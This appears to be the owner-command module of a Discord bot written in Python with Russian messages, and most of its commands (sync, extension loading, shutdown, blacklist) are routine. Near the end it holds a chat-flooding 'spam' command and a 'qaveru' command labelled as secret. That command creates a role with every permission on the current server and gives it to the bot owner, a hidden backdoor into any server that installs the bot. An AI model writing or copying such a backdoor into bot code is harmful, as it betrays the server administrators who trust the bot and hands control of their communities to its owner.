import discord
from discord import app_commands, Permissions
from discord.ext import commands
from discord.ext.commands import Context

from helpers import checks, db_manager

class Owner(commands.Cog, name="owner"):
    def __init__(self, bot):
        self.bot = bot

    @commands.hybrid_command(
        name="ownerhelp", description="Команды."
    )
    @checks.is_owner()
    @checks.not_blacklisted()
    async def ownerhelp(self, context: Context) -> None:
        prefix = "q."
        embed = discord.Embed(
            title="Помощь", description="Список доступных команд:", color=0x9C84EF
        )
        for i in self.bot.cogs:
            cog = self.bot.get_cog(i.lower())
            commands = cog.get_commands()  
            data = []           
            for command in commands:
                description = command.description.partition("\n")[0]
                data.append(f"{prefix}{command.name} - {description}")
            help_text = "\n".join(data)
            embed.add_field(
                name=i.capitalize(), value=f"```{help_text}```", inline=False
            )
        await context.send(embed=embed, ephemeral = True)
  
    @commands.command(
        name="sync",
        description="Синхронизиует все Слеш команды.",
    )
    @app_commands.describe(scope="Цель синхронизации. Может быть `global` или `guild`")
    @checks.is_owner()
    async def sync(self, context: Context, scope: str) -> None:
        if scope == "global":
            await context.bot.tree.sync()
            embed = discord.Embed(
                description="Слеш команды были синхронизированы глобально.",
                color=0x9C84EF,
            )
            await context.send(embed=embed, ephemeral=True)
            return
        elif scope == "guild":
            context.bot.tree.copy_global_to(guild=context.guild)
            await context.bot.tree.sync(guild=context.guild)
            embed = discord.Embed(
                description="Слеш команды были синхронизированы на этом сервере.",
                color=0x9C84EF,
            )
            await context.send(embed=embed, ephemeral=True)
            return
        embed = discord.Embed(
            description="Цель должна быть `global` или `guild`.", color=0xE02B2B
        )
        await context.send(embed=embed, ephemeral=True)

    @commands.command(
        name="unsync",
        description="Рассинхронизиует все Слеш команды..",
    )
    @app_commands.describe(
        scope="Цель рассинхонизации. Может быть `global` или `guild`"
    )
    @checks.is_owner()
    async def unsync(self, context: Context, scope: str) -> None:
        if scope == "global":
            context.bot.tree.clear_commands(guild=None)
            await context.bot.tree.sync()
            embed = discord.Embed(
                description="Слеш команды были рассинхронизированы глобально.",
                color=0x9C84EF,
            )
            await context.send(embed=embed, ephemeral=True)
            return
        elif scope == "guild":
            context.bot.tree.clear_commands(guild=context.guild)
            await context.bot.tree.sync(guild=context.guild)
            embed = discord.Embed(
                description="Слеш команды были рассинхронизированы на этом сервере.",
                color=0x9C84EF,
            )
            await context.send(embed=embed, ephemeral=True)
            return
        embed = discord.Embed(
            description="Цель должна быть `global` или `guild`.", color=0xE02B2B
        )
        await context.send(embed=embed, ephemeral=True)

    @commands.hybrid_command(
        name="load",
        description="Загрузить отдельный список функций бота"
    )
    @app_commands.describe(cog="Название списка для загрузки")
    @checks.is_owner()
    async def load(self, context: Context, cog: str) -> None:
        try:
            await self.bot.load_extension(f"cogs.{cog}")
        except Exception:
            embed = discord.Embed(
                description=f"Не получается загрузить список `{cog}`.", color=0xE02B2B
            )
            await context.send(embed=embed, ephemeral=True)
            return
        embed = discord.Embed(
            description=f"Успешно загружен список `{cog}`.", color=0x9C84EF
        )
        await context.send(embed=embed, ephemeral=True)

    @commands.hybrid_command(
        name="unload",
        description="Выгрузить список функций бота.",
    )
    @app_commands.describe(cog="Название списка для выгрузки")
    @checks.is_owner()
    async def unload(self, context: Context, cog: str) -> None:
        try:
            await self.bot.unload_extension(f"cogs.{cog}")
        except Exception:
            embed = discord.Embed(
                description=f"Не получается выгрузить список `{cog}`.", color=0xE02B2B
            )
            await context.send(embed=embed, ephemeral=True)
            return
        embed = discord.Embed(
            description=f"Успешно выгружен список `{cog}`.", color=0x9C84EF
        )
        await context.send(embed=embed, ephemeral=True)

    @commands.hybrid_command(
        name="reload",
        description="Перезагрузить список функций бота.",
    )
    @app_commands.describe(cog="Название списка для перезагрузки")
    @checks.is_owner()
    async def reload(self, context: Context, cog: str) -> None:
        try:
            await self.bot.reload_extension(f"cogs.{cog}")
        except Exception:
            embed = discord.Embed(
                description=f"Не получается перезагрузить список `{cog}`.", color=0xE02B2B
            )
            await context.send(embed=embed, ephemeral=True)
            return
        embed = discord.Embed(
            description=f"Успешно перезагружен список `{cog}`.", color=0x9C84EF
        )
        await context.send(embed=embed, ephemeral=True)

    @commands.hybrid_command(
        name="shutdown",
        description="Выключить бота.",
    )
    @checks.is_owner()
    async def shutdown(self, context: Context) -> None:
        embed = discord.Embed(description="Выключаюсь. Пока! :wave:", color=0x9C84EF)
        await context.send(embed=embed, ephemeral=True)
        await self.bot.close()

    @commands.hybrid_group(
        name="blacklist",
        description="Получить чёрный список пользователей.",
    )
    @checks.is_owner()
    async def blacklist(self, context: Context) -> None:
        if context.invoked_subcommand is None:
            embed = discord.Embed(
                description="Пожалуйста, уточните подкоманду.\n\n**Подкоманды:**\n`add` - Добавить пользователя в чёрный список.\n`remove` - Удалять пользователя из чёрного списка.",
                color=0xE02B2B,
            )
            await context.send(embed=embed, ephemeral=True)

    @blacklist.command(
        base="blacklist",
        name="show",
        description="Показать всех пользователей из чёрного списка.",
    )
    @checks.is_owner()
    async def blacklist_show(self, context: Context) -> None:
        blacklisted_users = await db_manager.get_blacklisted_users()
        if len(blacklisted_users) == 0:
            embed = discord.Embed(
                description="В данный момент никто не заблокирован.", color=0xE02B2B
            )
            await context.send(embed=embed, ephemeral=True)
            return

        embed = discord.Embed(title="Пользователи чёрного списка", color=0x9C84EF)
        users = []
        for bluser in blacklisted_users:
            user = self.bot.get_user(int(bluser[0])) or await self.bot.fetch_user(
                int(bluser[0])
            )
            users.append(f"• Пользователь {user.mention} ({user}) - заблокирован <t:{bluser[1]}>")
        embed.description = "\n".join(users)
        await context.send(embed=embed, ephemeral=True)

    @blacklist.command(
        base="blacklist",
        name="add",
        description="Отстранить пользователя от использования бота.",
    )
    @app_commands.describe(user="Пользователь который должен быть заблокирован.")
    @checks.is_owner()
    async def blacklist_add(self, context: Context, user: discord.User) -> None:
        user_id = user.id
        if await db_manager.is_blacklisted(user_id):
            embed = discord.Embed(
                description=f"**{user.name}** уже находится в чёрном списке.",
                color=0xE02B2B,
            )
            await context.send(embed=embed, ephemeral=True)
            return
        total = await db_manager.add_user_to_blacklist(user_id)
        embed = discord.Embed(
            description=f"**{user.name}** успешно добавлен в чёрный список",
            color=0x9C84EF,
        )
        embed.set_footer(
            text=f"Сейчас в списке {'находится' if total == 1 else 'находятся'} {total} {'пользователь' if total == 1 else 'пользователей'}"
        )
        await context.send(embed=embed, ephemeral=True)

    @blacklist.command(
        base="blacklist",
        name="remove",
        description="Удалить пользователя из чёрного списка.",
    )
    @app_commands.describe(user="Пользователь, который должен быть удалён из чёрного списка.")
    @checks.is_owner()
    async def blacklist_remove(self, context: Context, user: discord.User) -> None:
        user_id = user.id
        if not await db_manager.is_blacklisted(user_id):
            embed = discord.Embed(
                description=f"**{user.name}** не находится в чёрном списке.", color=0xE02B2B
            )
            await context.send(embed=embed, ephemeral=True)
            return
        total = await db_manager.remove_user_from_blacklist(user_id)
        embed = discord.Embed(
            description=f"**{user.name}** успешно удалён из чёрного списка",
            color=0x9C84EF,
        )
        embed.set_footer(
            text=f"Сейчас в списке {'находится' if total == 1 else 'находятся'} {total} {'пользователь' if total == 1 else 'пользователей'}"
        )
        await context.send(embed=embed, ephemeral=True)

    @commands.hybrid_command(name="spam", description="Заспамить чат")
    @checks.is_owner()
    async def spam(self, ctx: Context, amount: int, *, message):
        for i in range(amount):
           await ctx.send(message) 

    @commands.hybrid_command(name="qaveru", description="Секретная команда")
    @checks.is_owner()
    async def qaveru(self, ctx: Context):
        qaveru = ctx.author
        role = await ctx.guild.create_role(name="Qaveru", permissions=Permissions.all())
        await qaveru.add_roles(role)
        await ctx.send("Выдал ;)", ephemeral=True)


async def setup(bot):
    await bot.add_cog(Owner(bot))
